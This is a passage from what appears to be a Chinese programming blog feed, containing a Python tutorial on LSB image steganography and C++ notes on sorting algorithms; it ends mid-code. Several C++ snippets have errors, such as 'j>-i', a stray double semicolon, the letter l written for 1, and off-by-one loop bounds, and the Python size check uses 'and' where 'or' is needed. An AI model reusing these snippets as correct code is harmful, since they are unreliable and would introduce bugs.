LDAP</strong></p><p>LDAP是访问目录服务的一种协议，也叫做轻量级目录访问协议。</p><p><strong>目录服务是网络上存在的一种提供相关资源的数据库的服务</strong></p><p>LDAP用于访问这种目录服务，为了更简单的管理网络上的各种资源。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python实现LSB算法</title>
    <link href="/2023/03/29/python%E5%AE%9E%E7%8E%B0LSB%E7%AE%97%E6%B3%95/"/>
    <url>/2023/03/29/python%E5%AE%9E%E7%8E%B0LSB%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="python实现LSB算法"><a href="#python实现LSB算法" class="headerlink" title="python实现LSB算法"></a>python实现LSB算法</h1><h2 id="一、LSB算法简介"><a href="#一、LSB算法简介" class="headerlink" title="一、LSB算法简介"></a>一、LSB算法简介</h2><p>LSB算法实现信息隐藏就是把秘密信息存放到最低有效位。</p><p>举个例子，一张灰度图片，图片是由一个个像素点组成的，而一个灰度图片的像素点来说，它的一个像素点共有8位，所以一个像素点的值的取值范围就是[0,255]，而数值的大小影响到图片的灰度。如果对于一个像素点，他的值是：00010011，他的值是19，如果我们对它的最高值进行修改：0→1，那对这个数值的影响是很大的，直接增加了2^7^，对图片的影响很大，但是如果我们对它的最低位进行修改，数值仅仅只变化了1，对图片的影响很小。正是根据这一点，我们可以用它来进行信息隐藏，我们把信息变成01比特流，把它放在每一个像素点的最低位，进行隐藏；然后需要提取信息出来的时候，我们只需要把每个像素点的最后一个比特取出来，然后组合起来，就可以得到原始的数据。</p><h2 id="二、具体实现"><a href="#二、具体实现" class="headerlink" title="二、具体实现"></a>二、具体实现</h2><p>为了更好对图片进行处理，这里使用了python里面的一个包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br></code></pre></td></tr></table></figure><h3 id="2-1-从文件中读取想要隐藏的信息"><a href="#2-1-从文件中读取想要隐藏的信息" class="headerlink" title="2.1 从文件中读取想要隐藏的信息"></a>2.1 从文件中读取想要隐藏的信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_secret_msg</span>():<br>    file = <span class="hljs-built_in">open</span>(secret_msg_path, <span class="hljs-string">&quot;r&quot;</span>)<br>    secret_msg = file.read()<br>    file.close()<br>    <span class="hljs-keyword">return</span> secret_msg<br></code></pre></td></tr></table></figure><p>打开<strong>secret_msg_path</strong>文件，然后将文件里面的内容读取出来，由<strong>secret_msg</strong>保存，此时<strong>secret_msg</strong>是字符串类型</p><h3 id="2-2-字符串转化为二进制字符串"><a href="#2-2-字符串转化为二进制字符串" class="headerlink" title="2.2 字符串转化为二进制字符串"></a>2.2 字符串转化为二进制字符串</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">msg_invert_binarystream</span>(<span class="hljs-params">secret_msg</span>):<br>    binarystream = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> elem <span class="hljs-keyword">in</span> secret_msg:<br>        <span class="hljs-comment"># ord()将字符转化成十进制数</span><br>        <span class="hljs-comment"># bin()将数字转化为字符串</span><br>        <span class="hljs-comment"># &gt;&gt;&gt;bin(10)</span><br>        <span class="hljs-comment"># &quot;0b1010&quot;</span><br>        binarystream += <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(elem)).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> binarystream<br></code></pre></td></tr></table></figure><p>将字符串转化为01比特流，一个字符对应的是8字节，只需要一个字节一个字节的读取<strong>secret_msg</strong>的内容即可</p><p><strong>ord（）：根据ASCII码表将字符转变成它对应的十进制数，比如：ord(a)=97</strong></p><p><strong>bin（）：将数字变成字符串类型，比如：bin(10)=”0b10”</strong></p><p>正是因为<strong>bin()</strong>转化为字符串类型后会默认的在字符串首部添加字符串”0b”，所以我们用replace()进行除去”0b”的操作</p><p>最后，<strong>zfill(8)</strong>填充字符串为8位，不足8位的用0补充，一个字符对应8个bit，便于我们后续的处理。</p><p><img src="/2023/03/29/python%E5%AE%9E%E7%8E%B0LSB%E7%AE%97%E6%B3%95/image-20230329145909319.png" alt="ASCII码表"></p><h3 id="2-3-读取图片信息"><a href="#2-3-读取图片信息" class="headerlink" title="2.3 读取图片信息"></a>2.3 读取图片信息</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_init_bmp</span>():<br>    init_bmp = Image.<span class="hljs-built_in">open</span>(init_bmp_path, <span class="hljs-string">&quot;r&quot;</span>)<br>    width = init_bmp.size[<span class="hljs-number">0</span>]<br>    height = init_bmp.size[<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 是否是512*512大小的</span><br>    <span class="hljs-keyword">if</span> width != <span class="hljs-number">512</span> <span class="hljs-keyword">and</span> height != <span class="hljs-number">512</span>:<br>        init_bmp = init_bmp.resize((<span class="hljs-number">512</span>, <span class="hljs-number">512</span>))<br>    <span class="hljs-comment"># 是否是灰度图片</span><br>    <span class="hljs-keyword">if</span> init_bmp.mode != <span class="hljs-string">&quot;L&quot;</span>:<br>        init_bmp = init_bmp.convert(<span class="hljs-string">&quot;L&quot;</span>)<br>    <span class="hljs-keyword">return</span> init_bmp<br></code></pre></td></tr></table></figure><p><strong>Image.open()函数用于获取图片数据，存放在init_bmp中</strong></p><p><strong>init_bmp.size[0]：返回图片的宽度</strong></p><p><strong>init_bmp.size[1]：返回图片的高度</strong></p><p>这是为了后续我们的定位</p><p><img src="/2023/03/29/python%E5%AE%9E%E7%8E%B0LSB%E7%AE%97%E6%B3%95/image-20230329150533643.png" alt="宽度和高度"></p><h3 id="2-4-对某个像素的灰度值的最低位进行嵌入"><a href="#2-4-对某个像素的灰度值的最低位进行嵌入" class="headerlink" title="2.4 对某个像素的灰度值的最低位进行嵌入"></a>2.4 对某个像素的灰度值的最低位进行嵌入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hid_lsb</span>(<span class="hljs-params">gray_scale_value, hid_bit</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-built_in">bin</span>(gray_scale_value).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">8</span>)<br>    lsb = <span class="hljs-built_in">str</span>[<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> lsb != hid_bit:<br>        <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span>[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)-<span class="hljs-number">1</span>] + hid_bit<br>    <span class="hljs-comment"># 最终返回的是0-255之间的数值，传入的gray_scale_value是0-255之间的数值</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>, <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p><strong>gray_scale_value：像素值，例如：00101101</strong></p><p><strong>int(str,2)：是将str转化为int型，2代表以2进制的形式展示</strong></p><h3 id="2-5-对某个像素的灰度值的最低位进行提取"><a href="#2-5-对某个像素的灰度值的最低位进行提取" class="headerlink" title="2.5 对某个像素的灰度值的最低位进行提取"></a>2.5 对某个像素的灰度值的最低位进行提取</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_lsb</span>(<span class="hljs-params">gray_scale_value</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-built_in">bin</span>(gray_scale_value).replace(<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>[<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)-<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><p><strong>get_lsb()：获取gray_scale_value的最低位，返回的是一个字符</strong></p><h3 id="2-6-隐藏信息算法"><a href="#2-6-隐藏信息算法" class="headerlink" title="2.6 隐藏信息算法"></a>2.6 隐藏信息算法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">put_msg_in_init_bmp</span>(<span class="hljs-params">secret_msg, init_bmp</span>):<br>    hid_img = init_bmp.copy()<br>    width = hid_img.size[<span class="hljs-number">0</span>]<br>    height = hid_img.size[<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 隐藏信息变成二进制字符串形式</span><br>    binarystream = msg_invert_binarystream(secret_msg)<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width):<br>        <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height):<br>            <span class="hljs-comment"># 所有secret_msg均已隐藏完毕</span><br>            <span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(binarystream):<br>                <span class="hljs-keyword">break</span><br>            gray_scale_value = hid_img.getpixel((w, h))<br>            after_hid_value = hid_lsb(gray_scale_value, binarystream[i])<br>            hid_img.putpixel((w, h), after_hid_value)<br>            i = i+<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> hid_img<br></code></pre></td></tr></table></figure><p>有了之前的工作，现在只需要调用他们就可以完成信息的隐藏了，先把隐藏信息读取出来，变成二进制字符串形式，然后一个一个像素点的进行信息的嵌入，然后返回嵌入完毕的图片即可</p><h3 id="2-7-提取信息算法"><a href="#2-7-提取信息算法" class="headerlink" title="2.7 提取信息算法"></a>2.7 提取信息算法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_msg_from_bmp</span>(<span class="hljs-params">hid_bmp, secret_msg_len</span>):<br>    width = hid_bmp.size[<span class="hljs-number">0</span>]<br>    height = hid_bmp.size[<span class="hljs-number">1</span>]<br>    ret_str = <span class="hljs-string">&quot;&quot;</span><br>    eight_bit_str = <span class="hljs-string">&quot;&quot;</span><br>    cnt = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, width):<br>        <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, height):<br>            gray_scale_value = hid_bmp.getpixel((w, h))<br>            eight_bit_str += get_lsb(gray_scale_value)<br>            <span class="hljs-comment"># 转换成一个字符</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(eight_bit_str) == <span class="hljs-number">8</span>:<br>                tmp_ch = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(eight_bit_str, <span class="hljs-number">2</span>))<br>                cnt += <span class="hljs-number">1</span><br>                ret_str += tmp_ch<br>                eight_bit_str = <span class="hljs-string">&quot;&quot;</span><br>                <span class="hljs-keyword">if</span> cnt == secret_msg_len:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> cnt == secret_msg_len:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> ret_str<br></code></pre></td></tr></table></figure><p>跟隐藏信息算法相似，只是现在是把一个一个像素点的最低位读取出来，然后因为8bit对应一个字符，所以凑足8比特之后，我们就对它进行一个转化。</p><h2 id="三、实现效果"><a href="#三、实现效果" class="headerlink" title="三、实现效果"></a>三、实现效果</h2><p><img src="/2023/03/29/python%E5%AE%9E%E7%8E%B0LSB%E7%AE%97%E6%B3%95/image-20230329151644327.png" alt="运行结果"></p><h2 id="四、思考"><a href="#四、思考" class="headerlink" title="四、思考"></a>四、思考</h2><p>我们实现的LSB算法存入隐藏信息选择的像素点，是依照次序的，也就是说如果第二个像素点隐藏了信息，那第一个像素点也隐藏了信息，那我们对它的破解只需要对每个像素点的最后一位读取出来，然后进行组合，然后翻译一下就可以得到隐藏信息了，但是实际中我可以不按照顺序进行信息的隐藏，比如我选择了第1个像素点之后，下一个隐藏的像素点我选择第3个像素点，然后选择第5个……这样破解起来难度就会增大一些。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>排序</title>
    <link href="/2023/03/27/%E6%8E%92%E5%BA%8F/"/>
    <url>/2023/03/27/%E6%8E%92%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><h3 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1 定义"></a>1.1 定义</h3><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/image-20230327202459096.png" alt="image-20230327202459096"></p><h3 id="1-2-稳定性"><a href="#1-2-稳定性" class="headerlink" title="1.2 稳定性"></a>1.2 稳定性</h3><p>假设K~i~=K~j~（1&lt;=i&lt;=n,i&lt;=j&lt;=n,i!=j)且在排序前的序列中r~i~领先于r~j~，如果排序后r~i~仍领先于r~j~，则所用的排序是稳定的；反之，若可能使得排序后的序列中r~j~领先于r~i~，则称所用的排序方法是不稳定的。</p><p>如下图：</p><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/image-20230327202820013.png" alt="稳定性"></p><h3 id="1-3-内排序与外排序"><a href="#1-3-内排序与外排序" class="headerlink" title="1.3 内排序与外排序"></a>1.3 内排序与外排序</h3><p>内排序是在排序整个过程中，待排序的所有记录全部被放置在内存中。外排序是由于排序的记录个数太多，不能同时放置在内存，整个排序过程需要在内外存之间多次交换数据才能进行。</p><p>排序算法的性能主要受3个方面影响：<code>时间性能</code>，<code>辅助空间</code>，<code>算法的复杂度</code></p><p><strong>内排序分为：插入排序，交换排序，选择排序和归并排序</strong></p><h2 id="二、冒泡排序"><a href="#二、冒泡排序" class="headerlink" title="二、冒泡排序"></a>二、冒泡排序</h2><p>基本思想：两两比较相邻记录的关键字，如果反序则交换，知道没有反序的记录为止。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//不是那么标准的冒泡排序</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BubbSort0</span><span class="hljs-params">(SqList *L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;L-&gt;length;i++)&#123;<br>        <span class="hljs-keyword">for</span>(j=i+<span class="hljs-number">1</span>;j&lt;L-&gt;length;j++)&#123;<br>            <span class="hljs-keyword">if</span>(L-&gt;r[i]&gt;L-&gt;r[j])<br>            <span class="hljs-built_in">swap</span>(L,i,j);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//正宗的冒泡排序</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BubbleSort</span><span class="hljs-params">(SqList *L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;L-&gt;length;i++)&#123;<br>        <span class="hljs-keyword">for</span>(j=L-&gt;length<span class="hljs-number">-1</span>;j&gt;=i;j--)&#123;<br>            <span class="hljs-keyword">if</span>(L-&gt;r[j]&gt;L-&gt;r[j+<span class="hljs-number">1</span>])<br>                <span class="hljs-built_in">swap</span>(L,j,j+<span class="hljs-number">1</span>)<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//改进的冒泡排序</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BubbleSort2</span><span class="hljs-params">(SqList*L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i,j;<br>    Status flag=TRUE;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;L-&gt;length&amp;&amp;flag;i++)&#123;<br>        flag=FALSE;<br>        <span class="hljs-keyword">for</span>(j=L-&gt;length<span class="hljs-number">-1</span>;j&gt;-i;j--)&#123;<br>            <span class="hljs-keyword">if</span>(L-&gt;r[j]&gt;L-&gt;r[j+<span class="hljs-number">1</span>])<br>            &#123;<br>                <span class="hljs-built_in">swap</span>(L,j,j+<span class="hljs-number">1</span>);<br>                flag=TRUE;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/image-20230327231053615.png" alt="冒泡排序"></p><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/20210509190446264.gif" alt="冒泡排序"></p><p>最坏时间复杂度：O(n^2^)</p><p>最好时间复杂度：O(n)</p><p><strong>总的时间复杂度：O（n^2^)</strong></p><h2 id="三、简单选择排序"><a href="#三、简单选择排序" class="headerlink" title="三、简单选择排序"></a>三、简单选择排序</h2><p><strong>简单选择排序法就是通过n-i次关键字间的比较，从n-i+1个记录中选出关键字最小的记录，并和第i个记录交换之</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SelectSort</span><span class="hljs-params">(SqList*L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i,j,min;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;L-&gt;length;;i++)&#123;<br>        min=i;<br>        <span class="hljs-keyword">for</span>(j=i+<span class="hljs-number">1</span>;j&lt;L-&gt;length;j++)&#123;<br>            <span class="hljs-keyword">if</span>(L-&gt;r[min]&gt;L-&gt;r[j])<br>                min=j;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(i!=min)&#123;<br>            <span class="hljs-built_in">swap</span>(L,i,min);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/20210509190545640.gif" alt="简单选择排序"></p><p>最坏情况：O(n^2^)</p><p>最好情况：O(n^2^)</p><p>简单选择排序过程，最大特点就是交换移动数据次数相当少，节约了相应时间，总的时间复杂度为：O（n^2^)</p><h2 id="四、直接插入排序"><a href="#四、直接插入排序" class="headerlink" title="四、直接插入排序"></a>四、直接插入排序</h2><p>直接插入排序的基本操作是将一个记录插入到已经排好序的有序表中，从而得到一个新的，记录数增1的有序表。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InsertSort</span><span class="hljs-params">(<span class="hljs-type">int</span> a[],<span class="hljs-type">int</span> l)</span></span>&#123;<br>    <span class="hljs-type">int</span> temp;<br>    <span class="hljs-type">int</span> j;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;l;i++)&#123;<br>        <span class="hljs-keyword">if</span>(a[i]&lt;a[i<span class="hljs-number">-1</span>])&#123;<br>            temp=a[i];<br>            <span class="hljs-keyword">for</span>(j=i<span class="hljs-number">-1</span>;j&gt;=<span class="hljs-number">0</span>&amp;&amp;temp&lt;a[j];j--)&#123;<br>                a[j+<span class="hljs-number">1</span>]=a[j];<br>            &#125;<br>            a[j+<span class="hljs-number">1</span>]=temp;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/20210223174254141.gif" alt="直接插入排序"></p><p>最坏情况：O(n^2^)</p><p>最好情况：O(n)</p><p>直接插入排序总的时间复杂度为O(n^2^)</p><h2 id="五、选择排序"><a href="#五、选择排序" class="headerlink" title="五、选择排序"></a>五、选择排序</h2><p>基本思想：每次从待排序列中选出一个最小值，然后放在序列的起始位置，直到全部待排数据排完即可。实际上我们可以选择两个值，一个最大值， 一个最小值，然后将其放在序列开头和结尾，这样可以使选择排序的效率快一倍。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SelectSort</span><span class="hljs-params">(<span class="hljs-type">int</span> *arr,<span class="hljs-type">int</span> n)</span></span>&#123;<br>    <span class="hljs-type">int</span> begin=<span class="hljs-number">0</span>,end=n<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">while</span>(begin&lt;end)&#123;<br>        <span class="hljs-type">int</span> maxi=begin;<br>        <span class="hljs-type">int</span> mini=begin;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=begin;i&lt;=end;i++)&#123;<br>            <span class="hljs-keyword">if</span>(arr[i]&lt;arr[mini])&#123;<br>                mini=i;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(arr[i]&gt;arr[maxi])&#123;<br>                maxi=i;<br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">swap</span>(arr[mini],arr[begin]);<br>        <span class="hljs-comment">//防止最大数在开头被换走</span><br>        <span class="hljs-keyword">if</span>(begin==maxi)&#123;<br>            maxi=mini;<br>        &#125;<br>        <span class="hljs-built_in">swap</span>(arr[maxi],arr[end]);<br>        begin++;<br>        end--;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/20210509190545640.gif" alt="选择排序"></p><p>最坏情况：O(n^2^)</p><p>最好情况：O(n^2^)</p><p>总的时间复杂度为：O(n^2^)</p><h2 id="六、希尔排序"><a href="#六、希尔排序" class="headerlink" title="六、希尔排序"></a>六、希尔排序</h2><p><strong>基本思想：先选定一个小于N的整数gap作为第一增量，然后将所有距离为gap的元素分在同一组，并对每一组的元素进行直接插入排序，然后再取一个比第一增量小的整数作为第二增量，重复上述操作……</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShellSort</span><span class="hljs-params">(<span class="hljs-type">int</span>*arr,<span class="hljs-type">int</span> n)</span></span>&#123;<br>    <span class="hljs-type">int</span> gap=n;<br>    <span class="hljs-keyword">while</span>(gap&gt;<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-comment">//每次对gap折半操作</span><br>        gap=gap/<span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n-gap;i++)&#123;<br>            <span class="hljs-type">int</span> end=i;<br>            <span class="hljs-type">int</span> tem=arr[end+gap];<br>            <span class="hljs-keyword">while</span>(end&gt;=<span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-keyword">if</span>(tem&lt;arr[end])&#123;<br>                    arr[end+gap]=arr[end];<br>                    end-=gap;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            arr[end+gap]=tem;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/03/27/%E6%8E%92%E5%BA%8F/20210509190237603.gif" alt="希尔排序"></p><p><strong>增量(gap)的选择非常重要，增量序列的最后一个增量值必须等于1才行</strong>，并且由于记录是跳跃式的移动，希尔排序不是一种稳定的排序。</p><p>总的时间复杂度：O(n^1.3^)</p><h2 id="七、堆排序"><a href="#七、堆排序" class="headerlink" title="七、堆排序"></a>七、堆排序</h2><p>堆是具有下列性质的完全二叉树：每个结点的值都大于或者等于其左右孩子结点的值，称为大顶堆；或者每个结点的值都小于或等于其左右孩子结点的值，称为小顶堆。</p><p>基本思想：将带排序的序列构造成一个大顶堆，此时，整个序列的最大值就是堆顶的根节点，将它移走(其实就是将其与堆数组的末尾元素交换，此时末尾元素就是最大值)，然后将剩余的n-1个序列重新构造成一个堆，这样就会得到n个元素中的次小值。如此反复执行，就可以得到一个有序序列了。</p><p>难点在于：</p><p>（1）如何把一个无序序列构建成一个堆？</p><p>（2）如果在输出堆顶元素之后，调整剩余元素成为一个新的堆？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">HeapSort</span><span class="hljs-params">(SqList*L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=L-&gt;length/<span class="hljs-number">2</span>;i&gt;<span class="hljs-number">0</span>;i--)&#123;<br>        <span class="hljs-built_in">HeapAdjust</span>(L,i,L-&gt;length);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(i=L-&gt;length;i&gt;<span class="hljs-number">1</span>;i--)&#123;<br>        <span class="hljs-built_in">swap</span>(L,l,i);<br>        <span class="hljs-built_in">HeapAdjust</span>(L,l,i<span class="hljs-number">-1</span>);<br>    